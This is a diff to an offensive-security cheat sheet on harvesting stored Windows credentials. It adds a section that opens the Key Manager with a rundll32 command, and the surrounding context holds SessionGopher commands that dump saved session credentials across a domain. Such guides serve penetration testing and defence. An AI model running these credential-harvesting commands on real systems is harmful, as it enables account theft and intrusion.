@@ -23,6 +23,7 @@
     * [Wifi passwords](#wifi-passwords)
     * [Sticky Notes passwords](#sticky-notes-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
+    * [Passwords stored in Key Manager](#passwords-stored-in-key-manager)
     * [Powershell History](#powershell-history)
     * [Powershell Transcript](#powershell-transcript)
     * [Password in Alternate Data Stream](#password-in-alternate-data-stream)
@@ -585,6 +586,15 @@ https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.p
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
+```
+
+
+### Passwords stored in Key Manager
+
+:warning: This software will display its output in a GUI
+
+```ps1
+rundll32 keymgr,KRShowKeyMgr
 ```
 
 ### Powershell History
